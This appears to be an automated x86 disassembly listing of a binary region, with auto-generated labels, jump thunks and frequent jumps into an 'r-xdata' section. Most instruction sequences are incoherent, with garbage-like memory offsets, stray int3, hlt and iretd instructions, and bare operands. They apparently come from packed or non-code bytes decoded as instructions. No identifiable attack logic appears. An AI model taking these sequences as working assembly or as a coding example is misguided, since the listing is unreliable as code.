jmp sub_47a796
sub_47a79e
pop ds
pop edi
imul edi [ ebx - 0xa ] 0x3f
pop edi
imul ebp [ ebx ] 0x74
int3
sub_47a7d2
jmp r-xdata
mov esi ebx
fwait
xchg edx eax
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x7b71ac6e ] al
test bl ch
jmp r-xdata
test bl dh
sub_47a7de
test [ ebx + ebp * 8 + 0x74ebebeb ] al
j_sub_47a7de#2
jmp sub_47a7de
j_sub_47a7df
jmp sub_47a7df
j_sub_47a7de
jmp j_sub_47a7de#2
j_sub_47a7df#2
jmp j_sub_47a7df
sub_47a880
j_sub_47a880
jmp sub_47a880
sub_47a94e
jmp r-xdata
jmp r-xdata
jmp sub_47a957
j_sub_47a93d#2
jmp sub_47a93d
j_sub_47a94e
jmp sub_47a94e
j_sub_47a93d
jmp j_sub_47a93d#2
j_sub_47a9a6
jmp sub_47a9a6
j_sub_47a9ef
jmp j_sub_47a9ef#2
sub_47aa28
xor edi [ edi + 0x74 ]
int3
sub_47aa3e
mov cl 0x84
test [ ebx - 0x7b7b4264 ] dl
xchg edx eax
iretd
sub_47aa50
jmp r-xdata
j_sub_47aa3e
jmp sub_47aa3e
j_sub_47aa4e
jmp sub_47aa4e
j_sub_47aa50
jmp sub_47aa50
j_sub_47a9ef#2
jmp sub_47a9ef
sub_47aae7
jmp r-xdata
xchg edx eax
cmp eax 0xeb7b7b60
j_sub_47aaf6
jmp sub_47aaf6
j_sub_47aaf7
jmp sub_47aaf7
sub_47ab1b
sbb eax 0x92a536f2
sub [ edx + 0x7b ] edi
jpo r-xdata
movsb [ edi ] [ esi ]
cdq
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47ab38
retn
sub_47ac1c
sub_47ac22
test bl ch
jmp sub_47ac1c
sub_47ac85
add [ esp + eax * 4 + 0x7b6b2192 ] 0x7b
jmp sub_47ac7a
sub_47ac94
cmpsb [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47ac22
sub_47ade2
idiv bh
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47af74
mov ebx 0x84b3b592
test bl ch
jmp r-xdata
je r-xdata
[ esi - 0x6c7b7b4d ]
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub_47b01a
xchg edx eax
inc eax
pop [ esp + eax * 4 - 0x460f1415 ]
sbb eax 0xf0af3ef2
mov edx 0xad3ef21d
and edx [ ecx ]
or [ edx - 0x7b7b663b ] dl
jmp r-xdata
mov ecx 0xaf3ef21d
sub_47b06d
j_sub_47b06f
jmp sub_47b06f
sub_47b0a1
idiv dh
add eax [ esi - 0x616c7b7c ]
xchg ecx eax
test [ edx + edx * 4 + 0x7b7b61c1 ] al
jmp r-xdata
jmp r-xdata
sub_47b0cd
xchg edx eax
test eax 0xfe748484
cmc
mov edx 0x6f68484
xchg ebx eax
div dh

sub_47b107
mov bh 0x9a
test [ ebx + ebp * 8 + 0x6d3ef21d ] al
xchg edx eax
hlt
sub_47b15a
jmp r-xdata
test bl ch
dec eax
mov ebx 0xebebb83b
jmp r-xdata
xchg edx eax
in eax dx
add [ esp + eax * 4 + 0x4e9220eb ] 0x9d
test [ ebx + ebp * 8 - 0x47c444b8 ] al
jmp r-xdata
push edi
j_sub_47b15a
jmp sub_47b15a
j_sub_47b4a4
jmp sub_47b4a4
j_sub_47b4a5
jmp sub_47b4a5
sub_47b4ec
clc
mov edi 0x927b1177
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47b511
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
xchg esp eax
xchg ebx eax
j_sub_47b511
jmp sub_47b511
sub_47b538
mov ah 0x6b
jpo r-xdata
jmp sub_47b5a4
sub_47b540
scasd [ edi ]
xchg edx eax
push ebx
push 0xebeb7b7b
jmp r-xdata
je r-xdata
push [ ebx + ebp * 2 + 0x35f07b7b ]
push ebx
j_sub_47b538
jmp sub_47b538
j_sub_47b540
jmp sub_47b540
sub_47b55f
sbb eax 0xf08b36f2
mov bl 0x92
fwait
lodsd [ esi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
cmp edx [ edx - 0x7b7b504b ]
jmp r-xdata
mov esi eax
j_sub_47b5cf
jmp sub_47b5cf
sub_47b5a4
j_sub_47b5a2
jmp sub_47b5a2
sub_47b5ba
test [ ebx + ebx * 2 ] ch
[ edx + 0x26 ] eax
sub_47b5c2
xchg [ edx + 0x7b7b7e68 ] edx
jmp j_sub_47b5a2
sub_47b5cf
and [ edx - 0x7b7b5794 ] edx
jmp sub_47b5c2
sub_47b606
idiv [ esi ]
xchg [ edx - 0x7b7b39c9 ] edx
and edx [ ecx ]
adc al 0x21
adc [ eax ] ebx
xchg edx eax
mov [ ecx - 0x14147b7c ] al
adc [ eax ] ecx
sub_47b6c8
test [ 0xffffffff9b2b9247 ] ch
test [ ebx + ebp * 8 - 0x68137b15 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp sub_47b658
test [ edi - 0x474d7b7c ] dl
jmp r-xdata
jpo r-xdata
xchg edi eax
sub ebx [ ebx - 0x14147b7c ]
test ah ch
sub_47b6e1
jmp r-xdata
[ ecx - 0x7b688e6e ]
j_sub_47b73e
jmp sub_47b73e
sub_47b887
push ss
and [ edx + 0x7b7b71df ] dl
sub edi [ esi + edi + 0xd1f1a9b ]
sbb bh [ esi + edi + 0x48120b9f ]
int3
jmp r-xdata
dec ecx
mov ebp 0x847b933e
sub eax 0x69d99233
jpo r-xdata
mov esp 0x120b9f3e
dec eax
sub_47b91f
mov ah [ esi + 0x12 ]
cmp eax [ esp + ecx * 8 + 0x7b7b7bbf ]
xchg edx eax
mov al 0x78
jpo r-xdata
test [ esi ] ch
xchg ebx eax
dec edi
retn
j_sub_47b91f
jmp sub_47b91f
sub_47bad7
jmp r-xdata
mov dl 0x84
test bl ch
jmp r-xdata
xchg edx eax
sbb al 0x87
test [ edx + edi * 4 - 0x7a0f8166 ] al
mov edx 0x927994
j_sub_47bad7
jmp sub_47bad7
sub_47bbb5
test [ 0xffffffff8212922b ] cl
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ eax + esi * 8 + 0x63f26b3e ] al
sub [ edx - 0x7b7b3c42 ] dl
jmp r-xdata
dec [ ebp - 0x5bd4008c ]
sub_47bbba
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
test [ eax + esi * 8 + 0x63f26b3e ] al
sub [ edx - 0x7b7b3c42 ] dl
jmp r-xdata
dec [ ebp - 0x5bd4008c ]
sub_47bbc5
movsd [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
sub_47bbd1
xchg [ edx - 0x7b7b3f4b ] edx
jmp sub_47bbc5
j_sub_47bc05
jmp sub_47bc05
j_sub_47bc64
jmp sub_47bc64
sub_47bc93
jmp r-xdata
jmp r-xdata
test [ esi + ecx - 0x7b84ee89 ] al
jmp r-xdata
adc [ ebx - 0x7c ] edi
j_sub_47bc93
jmp sub_47bc93
sub_47bd0c
inc [ ebx - 0x6c7b7b7a ]
add [ ebp - 0x166d7b7c ] ah
mov eax [ esp + eax * 4 - 0x14141415 ]
test [ esi ] cl
cmpsd [ esi ] [ edi ]
xchg edx eax
test [ edx - 0x4147b7c ] 0x6
imul edi [ ecx - 0x6e ] 0x1
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 + 0x13ebebeb ] al
faddp st2
[ esi + 0x2c ]
j_sub_47be04
jmp sub_47be04
sub_47be1a
mov ebx 0x92bae274
inc edx
cdq
test [ ebx + ebp * 8 - 0x7b3da26e ] al
test bl ch
jmp j_sub_47be04
j_sub_47be5a
jmp sub_47be5a
sub_47bebf
sub esi [ ebp + ecx * 8 + 0x38 ]
sub eax [ gs : eax + ecx + 0x2cbdf023 ]
xchg ebx eax
pop ebp
add [ esp + eax * 4 - 0x7b4cc26e ] 0xf7fe7484
xchg ebp eax
test [ edx + edx * 4 - 0x7b7b7b3f ] al
jmp r-xdata
sub_47bee6
jmp r-xdata
test [ esp + esi * 2 - 0x7b6a0802 ] al
test [ edx - 0x7b7b7b3f ] dl
jmp r-xdata
add [ esp + eax * 4 - 0x7b4cc26e ] 0xf7fe7484
xchg ebp eax
test [ edx + edx * 4 - 0x7b7b7b3f ] al
j_sub_47bee6
jmp sub_47bee6
sub_47c01e
jmp r-xdata
jmp sub_47c035
sub_47c020
test [ 0x74bbfe37 ] ch
jmp [ eax - 0x33 ]
sub_47c035
mov al [ 0xffffffff8c8484a5 ]
mov [ 0xfffffffff2ebb8b2 ] eax
mov bl 0x92
xchg [ esp + eax * 4 - 0x1414147c ] edi
jmp r-xdata
movsd [ edi ] [ esi ]
test [ esp + ecx * 4 - 0x14474d5d ] al
mov bl 0x92
sub_47c039
mov [ ebx - 0xd14474e ] fs
mov bl 0x92
xchg [ esp + eax * 4 - 0x1414147c ] edi
jmp r-xdata
movsd [ edi ] [ esi ]
test [ esp + ecx * 4 - 0x14474d5d ] al
mov bl 0x92
j_sub_47c039
jmp sub_47c039
sub_47c04d
jmp r-xdata
sub [ ebx ] dl
mov ah [ esi + 0x12 ]
cmp eax [ ebp + ecx * 8 + 0x7b7b7bbf ]
j_sub_47c039#2
jmp j_sub_47c039
sub_47c185
mov ebp 0x4b4c5f3f
xchg edx eax
mov ss [ edi - 0x14147b7c ]
jmp sub_47c126
sub_47c1cc
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
push 0xeb7b7b7f
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
sub_47c1f8
cmp eax 0xa39c937f
test [ ebx + edx + 0x4ddcfc1b ] al
sub al 0xf2
std

sub_47c20d
lodsd [ esi ]
mov [ 0xfffffffffdf28484 ] eax
iretd
sub_47c23e
sbb eax 0xf6833ef2
[ 0xffffffff84a32992 ]
sub_47c24a
test [ 0x238f3ef2 ] bl
sbb eax 0x488d3ef2
mov ebx 0x84c47792
test bl ch
jmp r-xdata
test [ ebp + ebx + 0x238f3ef2 ] al
sub_47c2de
jmp r-xdata
and edx [ ecx ]
push ebp
sbb eax 0x92813ef2
inc ebp
xchg esp eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
and [ ebx ] 0x11
j_sub_47c2de
jmp sub_47c2de
sub_47c3ac
jmp r-xdata
mov dl 0xb8
jmp r-xdata
xchg ebx eax
clc
scasd [ edi ]
test [ esp + ecx * 4 + 0x22bb60a3 ] al
mov [ ebx - 0xf14474e ] fs
xchg edi eax
sub ch [ edx ]
sub_47c3db
enter 0x8485 0x84
jmp r-xdata
scasd [ edi ]
test [ edi + ebp ] ch
sub_47c434
jmp r-xdata
test [ eax + ecx * 2 - 0x41dd6d73 ] al
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
mov eax 0xc79cff74
j_sub_47c434
jmp sub_47c434
sub_47c46f
test [ edx - 0x18b4402 ] al
cmp dh cl
test [ esi + esi * 8 + 0x5592ab3e ] al
0x8484
j_sub_47c46f
jmp sub_47c46f
j_sub_47c4ad
jmp sub_47c4ad
sub_47c490
r-xdata
jmp r-xdata
mov [ 0x7726f21d ] eax
and bh dh
mov ebx 0xce38fe74
test [ esi + esi * 8 + 0x5592ab3e ] al
0x8484
sub_47c492
jno r-xdata
jmp r-xdata
mov [ 0x7726f21d ] eax
and bh dh
mov ebx 0xce38fe74
test [ esi + esi * 8 + 0x5592ab3e ] al
0x8484
sub_47c49a
mov [ 0xffffffff84ccbc92 ] al
test bl ch
jmp j_sub_47c4ad
j_sub_47c490
jmp sub_47c490
j_sub_47c492
jmp sub_47c492
sub_47c4df
xchg edx eax
0x84a3
sub_47c519
sbb eax 0x119f26f2
sbb al 0xf0
mov [ 0xffffffff9d26f21d ] eax
dec eax
mov al [ 0xffffffff84c8d492 ]
test bl ch
jmp r-xdata
lahf
adc [ eax + esi * 8 ] ebx
sub_47c534
push es
xchg [ ebx ] ebp
sub [ ebp + ebp - 0x78c10fc1 ] al
xchg edx eax
idiv [ ebp + 0x6428484 ]
xchg [ edx - 0x7b7b497e ] edx
jmp r-xdata
test [ 0xffffffff873ef03f ] ch
sub_47c535
push es
xchg [ ebx ] ebp
sub [ ebp + ebp - 0x78c10fc1 ] al
xchg edx eax
idiv [ ebp + 0x6428484 ]
xchg [ edx - 0x7b7b497e ] edx
jmp r-xdata
test [ 0xffffffff873ef03f ] ch
sub_47c54e
adc [ edx + edx * 4 - 0xe ] esp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
inc edx
push es
xchg [ edx - 0x7b7b497e ] edx
jmp r-xdata
test [ 0xffffffff873ef03f ] ch
xchg edx eax
idiv [ ebp + 0x6428484 ]
j_sub_47c4df
jmp sub_47c4df
sub_47c560
adc [ ebx ] edi
retn
j_sub_47c560
jmp sub_47c560
j_sub_47c57d
jmp sub_47c57d
sub_47c593
sub_47c5a2
movsb [ edi ] fs : [ esi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv [ esi ]
j_sub_47c593
jmp sub_47c593
j_sub_47c5a2
jmp sub_47c5a2
sub_47c5ae
sub edx [ edx - 0x7b7b6021 ]
jmp j_sub_47c593
sub_47c5b8
xchg edx eax
xor [ eax + 0x7b ] edi
jpo sub_47c5ae
xchg edi eax
sub ch [ edx ]
sub_47c60b
sub [ edx - 0x7b7b738b ] dl
and al [ edx + 0x3e ]
xor [ edi + esi * 8 + 0x3d ] 0xffffffb2
test [ edx + edx * 4 - 0x7b7b53ce ] al
jmp r-xdata
jne r-xdata
mov esi 0xebeb8484
jmp sub_47c534
test [ edx + 0x74833e42 ] al
idiv [ 0xffffffff928484b2 ]
xor ch [ esp + eax * 4 - 0x1414147c ]
jmp sub_47c5b8
sub_47c65e
adc [ ebx ] esp
or [ ecx + 0x74 ] 0xfe
lea edi [ edx + 0x7b ]
jpo r-xdata
xchg edx eax
popfd
add [ esp + eax * 4 + 0x4982f8eb ] 0x74
dec [ ebp - 0xf848486 ]
xor esi [ ebx - 0x10 ]
mov esp 0x84946792
test bl ch
jmp r-xdata
sub_47c6d4
test [ es : edx - 0x7b7b752f ] edx
xchg ebx eax
fmulp st1
test [ eax + esi * 8 - 0x6d720175 ] al
mov eax ebp
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47c6f4
jmp r-xdata
sub_47c6f6
jmp r-xdata
dec [ ebp - 0x7b3a746e ]
test bl ch
jmp r-xdata
ror [ edx - 0x216c7b7c ] 0x1
leave
test [ eax + esi * 8 - 0x6d720175 ] al
mov eax ebp
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg ebx eax
fmulp st1
j_sub_47c6f4
jmp sub_47c6f4
j_sub_47c6f6
jmp sub_47c6f6
sub_47c915
push cs
xchg ebx eax
xchg edx eax
int3
sub_47cb36
jmp r-xdata
xchg edx eax
not [ esi - 0x6d7b7c ]
aad 0x84
test bl ch
jmp r-xdata
[ 0x118306f2 ] 0x2d
sub_47cb39
mov ebx 0xdc5dfe74
test [ esi + esi * 8 - 0x7d6d3cfa ] al
mov ah 0x84
test bl ch
jmp sub_47cb36
sub_47cb4d
j_sub_47cb4d
jmp sub_47cb4d
sub_47cb6e
xchg edx eax
not dl
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
mov eax 0xebebebeb
jmp r-xdata
mov ebx 0xebb82025
jmp r-xdata
jmp r-xdata
jmp j_sub_47cb4d
j_sub_47cb6e
jmp sub_47cb6e
sub_47cbe2
xchg ebx eax
push ds
mov bh 0x84
test [ edx ] ah
sub_47cbe9
mov ebx 0xa325fe74
test [ edx + edx * 4 - 0x7b7b5cc2 ] al
jmp sub_47cbe2
j_sub_47cbe9
jmp sub_47cbe9
sub_47cc75
jmp r-xdata
sub_47cd84
sub eax 0x928484a9
xor al 0xa9
test [ esp + eax * 4 - 0x1740f58 ] al
lea esi [ edi + edi * 8 - 0x49 ]
iretd
sub_47cdca
les esi [ esp + eax * 4 - 0x78c96c7c ]
test [ ebp + ebp + 0x12668a13 ] al
cmp eax [ esp + ecx * 8 + 0x7b7b7bbf ]
xchg ebx eax
pop eax
nop
test [ edx + edx * 4 - 0x7b7b5109 ] al
sub_47cdea
mov ebx 0xa03eff74
test [ ecx + edx - 0x46ddda7 ] al
int 0x84
test bl ch
jmp r-xdata
test [ esi + edi * 8 + 0x3eff74bb ] al
mov al [ 0x59118484 ]
and dl [ edx - 0x7b7b3205 ]
jmp r-xdata
scasb [ edi ]
sub_47ce00
test [ esi ] cl
lahf
test [ edi ] ch
xchg edx eax
xchg ebp eax
add [ esp + eax * 4 - 0x40071415 ] 0x6b
xchg edx eax
retn
sub_47ce18
mov dl 0x92
mov cl 0xde
test [ ebx + ebp * 8 - 0x7b7f786d ] al
test al bh
mov edi 0x5f274277
outsd
je r-xdata
cmp eax 0x928484c2
inc edx
retn 0x8484
j_sub_47cdca
jmp sub_47cdca
sub_47cf09
jmp sub_403988
sub_47cf10
pop ebp
retn
sub_47d107
jmp sub_403988
sub_47d10e
pop ebp
retn
